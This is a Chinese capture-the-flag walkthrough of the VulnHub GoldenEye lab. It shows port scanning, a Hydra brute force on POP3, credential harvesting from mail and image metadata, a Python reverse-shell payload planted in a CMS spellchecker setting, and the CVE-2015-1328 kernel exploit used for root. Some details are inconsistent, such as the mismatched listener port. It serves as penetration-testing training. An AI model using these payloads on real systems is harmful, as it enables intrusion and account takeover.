vlunhub-GoldenEye 下载链接如下:
https://www.vulnhub.com/entry/goldeneye-1,240/
0x00:安装VM后，第一步发现IP，扫描端口：

- 

```
netdiskcover -i eth0
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DTCxjubrlH5ndpkZ9C6Cl3GZaWia2TbszBtBscTVuJycu12Cwfm3lvHw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

通过名字确认IP是192.168.1.5

然后通过nmap扫描开放的端口：

- 

```
nmap -sS -sV -A -T5 -p- 192.168.1.5
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DLeY9HibUKJoBffEUKIu5nic0LvIPRIF4u5HclibOf2FTXxW8tlicMicIfWg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

0x01:web页面信息分析查看：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DkdDWjW7BuQ32vms9ib4WyhBYMgsm9ibxLYU84pcicLiayfzqGJXqJUu8aw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7D7KM600z4GnsYJiaNTG6EVp5d8kYAOrNbuWj5dVgYR7q6FfsxKkoJr7A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DyVwdUT4SNlZtN4oyNKQ7wGZzT6CBvHJrQZ8YBYsg8gjbic53ibiaVTauQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看出暴露了敏感信息：用户名和密码 

- 

```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

解密之后是：InvincibleHack3r

登录页面如下图：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DvszHUjdtYbtfia5EuoAfvRdhhCbd1UolxVGZyOMiaW9ukvLZChlWGAWQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

右键源代码如下:



```html
<html><head>
<link rel="stylesheet" href="index.css"></head>

<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
<source src="moonraker.webm" type="video/webm">

</video><div id="golden"><h1>GoldenEye</h1><p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p><p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p><p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p></div>

<script src="index.js"></script> <!-- 
```

通过信息分析55006/55007端口，通过打开网页的方式，判断是55007的端口。

0x02:爆破并获取敏感信息

使用九头蛇爆破：



```shell
└─# hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.1.5 -s 55007Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-06 18:53:09[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal![DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task[DATA] attacking pop3://192.168.1.5:55007/[STATUS] 80.00 tries/min, 80 tries in 00:01h, 364 to do in 00:05h, 16 active[55007][pop3] host: 192.168.1.5   login: boris   password: secret1![STATUS] 90.33 tries/min, 271 tries in 00:03h, 173 to do in 00:02h, 16 active[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.
[55007][pop3] host: 192.168.1.5   login: natalya   password: bird1 of 1 target successfully completed, 2 valid passwords found[WARNING] Writing restore file because 2 final worker threads did not complete until end.[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

截图如下：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DUhsNEHL7710Lvohs9SeMQYTm5zVn6sgudiarpWeh00JpWBXavc7dq6g/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

得到两个账号和密码信息：

natalya:bird

boris:secret1!



```
telnet 192.168.1.5 55007nc 192.168.1.5 55007
```



```shell
┌──(root㉿kali)-[~/oscp/goldeneye]└─# nc 192.168.1.5 55007+OK GoldenEye POP3 Electronic-Mail Systemuser boris+OKpass secret1!+OK Logged in.list+OK 3 messages:1 5442 3733 921.retr 1+OK 544 octetsReturn-Path: <root@127.0.0.1.goldeneye>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])  by ubuntu (Postfix) with SMTP id D9E47454B1  for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)Message-Id: <20180425022326.D9E47454B1@ubuntu>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)From: root@127.0.0.1.goldeneye
Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here..
retr 2+OK 373 octetsReturn-Path: <natalya@ubuntu>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])  by ubuntu (Postfix) with ESMTP id C3F2B454B1  for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)Message-Id: <20180425024249.C3F2B454B1@ubuntu>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)From: natalya@ubuntu
Boris, I can break your codes!.
retr 3+OK 921 octetsReturn-Path: <alec@janus.boss>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from janus (localhost [127.0.0.1])  by ubuntu (Postfix) with ESMTP id 4B9F4454B1  for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)Message-Id: <20180425025235.4B9F4454B1@ubuntu>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)From: alec@janus.boss
Boris,
Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
PS - Keep security tight or we will be compromised.
.
```

分别对两个账号进行登录后，查看信息。可以看到如下信息

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DZvslhneibr5XuK97JDfBZiczCVdV8aHZnTsqBnFiaNgl43630PtcS3tTw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

username: xenia

password: RCP90rulez!

根据信息：修改主机的/etc/hosts文件



```
192.168.1.5  severnaya-station.com
```

打开域名 severnaya-station.com/gnocertdir             

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DAIO9XSnEkVxM45T0KdKn3oK3BNicibbpwIyZc0kVCp6Q8nZbbPgh2ic7Q/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)





```
┌──(root㉿kali)-[~/oscp/goldeneye]└─# hydra -L user2.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.1.5 -s 55007Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-06 19:53:17[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal![DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task[DATA] attacking pop3://192.168.1.5:55007/[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active[55007][pop3] host: 192.168.1.5   login: doak   password: goat1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-06 19:55:39
```

user:doak. passwod:goat

```
┌──(root㉿kali)-[~/oscp/goldeneye]└─# nc 192.168.1.5 55007+OK GoldenEye POP3 Electronic-Mail System
user doak+OKpass goat+OK Logged in.list+OK 1 messages:1 606.
retr 1+OK 606 octetsReturn-Path: <doak@ubuntu>X-Original-To: doakDelivered-To: doak@ubuntuReceived: from doak (localhost [127.0.0.1])  by ubuntu (Postfix) with SMTP id 97DC24549D  for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)Message-Id: <20180425034731.97DC24549D@ubuntu>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)From: doak@ubuntu
James,If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
username: dr_doakpassword: 4England!
```

再一次得到敏感信息：用户名和密码 dr_doak/4England!

通过以上的用户名和密码，登录web页面

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DZQnc1WDzT54pcicHsumzCtkcAnfxO2thcqHHbiahYr1XlNURX50vYQ1A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

找到信息之后，打开图片的网页

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DHfEkGBmdIEqhEevbrHvZ3liavjV0heZTjz9NnVLt4Pk8ylyR0icHE1Ug/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

把图片下载下来后，查看图片中的信息：

0x03:  隐写术和base64解密                                                      



```shell
┌──(root㉿kali)-[~/oscp/goldeneye]
└─# exiftool for-007.jpg
ExifTool Version Number         : 12.44
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2024:02:06 20:20:13+08:00
File Access Date/Time           : 2024:02:06 20:20:39+08:00
File Inode Change Date/Time     : 2024:02:06 20:20:13+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```



python脚本如下：

```
┌──(root㉿kali)-[~/oscp/goldeneye]
└─# cat base64_decode.py
import base64

# 要解码的字符串
encoded_text = "eFdpbnRlcjE5OTV4IQ=="


# 对数据进行Base64解码
decode_data = base64.b64decode(encoded_text)
print("Base64编码结果：", decode_data.decode())


┌──(root㉿kali)-[~/oscp/goldeneye]
└─# python3 base64_decode.py
Base64编码结果： xWinter1995x!

┌──(root㉿kali)-[~/oscp/goldeneye]
└─#
```

最后得到了admin的密码                                        

0x04: cms漏洞利用

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DsPeExbhXzElZ23FwIcgXn7JYky3BzmLpR72Kia9KZldkTN2kKSdKGFQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

​              spell engine 变成pspellshell                         

构建一个反弹shell，payload：

- 

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",9966));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DIIwCQxLV4KXGTKIEtXIrmgaxx8230u655Eg7FxUno5oG8NsMobibRGQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

在path to aspell中加入payload后，在攻击机上nc开启监听：

nc -lvp 996

然后打开富文本写入内容后，点击Toggle spellchecker



![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7D9GHxElI3BrUOiasPPDApbkH2ibZvbic7h3StZWRh2QBhLxJJvuwwE4ksw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

至此进入了交互shell中。                                        

0x05:提权                                                  

下载LinEnum.sh和linux-exploit-suggester.sh脚本到攻击机上，并在攻击机打开http.server服务，                                               

- 

```shell
┌──(root㉿kali)-[~/oscp/goldeneye]
└─# python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.1.5 - - [06/Feb/2024 21:22:08] code 404, message File not found
192.168.1.5 - - [06/Feb/2024 21:22:08] "GET /LinEumn.s%7F%7F%7F%7F%7F%7F HTTP/1.1" 404 -
192.168.1.5 - - [06/Feb/2024 21:22:51] "GET /LinEnum.sh HTTP/1.1" 200 -

```

在Goldeneye机器上，通过wget下载sh文件，并执行，检查

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DbgmFwicN0vlCUBL1k98d3LsvL3GicaSr6vapr1icDSE1reWibJOwBk7ndg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

0x06:                                                     

cve-2015-1328与本机内核完全符合，下载37292.c文件并修改文件中gcc为cc，如下：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/yt0TxdOI0SzY7CF1mBpm6Nn0JMPB1C7DI5QvKw7MwrzsibQ0HllhayJtX7J2pEqWbqwrOAH5DVPdMCia1ib5soIIQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

然后在GoldenEye机器上下载并编译执行，提权

- 

```shell
$ cc -o exp 37292.c
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
$ ./exp
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# init 0
# s^?^?^?
sh: 3: s: not found
# help
sh: 4: help: not found
# help
sh: 5: help: not found
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

ps: cc和gcc的关系要研究一下！！！

至此提权到root。